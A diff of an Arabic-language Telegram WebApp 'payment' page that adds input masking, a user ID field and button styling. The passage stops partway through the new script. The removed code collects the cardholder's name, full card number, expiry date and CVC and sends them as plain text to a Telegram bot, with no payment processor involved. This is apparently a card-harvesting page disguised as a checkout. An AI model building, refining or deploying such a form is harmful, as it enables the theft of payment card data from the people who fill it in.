@@ -24,6 +24,11 @@
             width: 90%;
             max-width: 400px;
         }
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
         input {
             width: 100%;
             padding: 12px;
@@ -31,20 +36,35 @@
             border: 1px solid #ddd;
             border-radius: 8px;
             box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus {
+            outline: 2px solid #4a90e2;
         }
         .row { display: flex; gap: 10px; }
+        
+        /* تصميم الزر المعطل (رمادي) */
         button {
             width: 100%;
             padding: 12px;
-            background-color: #4a90e2;
-            color: white;
+            background-color: #cccccc;
+            color: #666666;
             border: none;
             border-radius: 8px;
-            cursor: pointer;
+            cursor: not-allowed;
             font-size: 16px;
-            margin-top: 10px;
+            margin-top: 15px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
         }
-        button:hover { background-color: #357abd; }
+        
+        /* تصميم الزر عندما يصبح مفعل (أزرق) */
+        button.active {
+            background-color: #4a90e2;
+            color: white;
+            cursor: pointer;
+        }
+        button.active:hover { background-color: #357abd; }
     </style>
 </head>
 <body>
@@ -52,47 +72,55 @@
     <div class="payment-card">
         <h2>💳 إتمام عملية الدفع</h2>
         <form id="paymentForm">
+            <input type="text" id="userId" placeholder="معرف المستخدم (ID)" inputmode="numeric" required>
+            
             <input type="text" id="name" placeholder="اسم صاحب البطاقة" required>
-            <input type="number" id="cardNum" placeholder="رقم البطاقة (16 رقم)" required>
+            
+            <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="19" inputmode="numeric" required>
+            
             <div class="row">
-                <input type="text" id="expiry" placeholder="MM/YY" required>
-                <input type="number" id="cvc" placeholder="CVC" required>
+                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+                
+                <input type="text" id="cvc" placeholder="CVC" maxlength="4" inputmode="numeric" required>
             </div>
-            <button type="button" onclick="sendData()">دفع الآن</button>
+            
+            <button type="button" id="submitBtn" onclick="sendData()" disabled>دفع الآن</button>
         </form>
     </div>
 
     <script>
-        // التأكد من تهيئة تطبيق تلجرام للويب
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand(); // تمديد النافذة لتظهر بشكل مريح للمستخدم
+        tg.expand();
 
-        function sendData() {
-            const name = document.getElementById('name').value;
-            const cardNum = document.getElementById('cardNum').value;
-            const expiry = document.getElementById('expiry').value;
-            const cvc = document.getElementById('cvc').value;
-            
-            // التحقق من أن الحقول غير فارغة
-            if(!name || !cardNum || !expiry || !cvc) {
-                alert("يرجى ملء كافة الحقول المطلوبة!");
-                return;
+        const form = document.getElementById('paymentForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // منع إدخال أي شيء عدا الأرقام لحقل الـ ID
+        document.getElementById('userId').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            validateForm();
+        });
+
+        // منع إدخال أي شيء عدا الحروف والمسافات لحقل الاسم
+        document.getElementById('name').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, '');
+            validateForm();
+        });
+
+        // تنسيق ومنع الحروف في رقم البطاقة
+        document.getElementById('cardNum').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+            let parts = [];
+            for (let i = 0; i < value.length; i += 4) {
+                parts.push(value.substring(i, i + 4));
             }
+            e.target.value = parts.join(' ');
+            validateForm();
+        });
 
-            // تجميع البيانات وتنسيقها
-            const data = `💳 نوع العملية: Credit Card
-👤 الاسم: ${name}
-🔢 رقم البطاقة: ${cardNum}
-📅 التاريخ: ${expiry}
-🔒 رمز الـ CVC: ${cvc}`;
-            
-            // إرسال البيانات إلى البوت (ستنجح الآن لأن الزر أصبح Keyboard)
-            tg.sendData(data);
-            
-            // إغلاق النافذة تلقائياً بعد الإرسال
-            tg.close();
-        }
-    </script>
-</body>
-</html>
+        // تنسيق ومنع الحروف في التاريخ
+        document.getElementById('expiry').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.
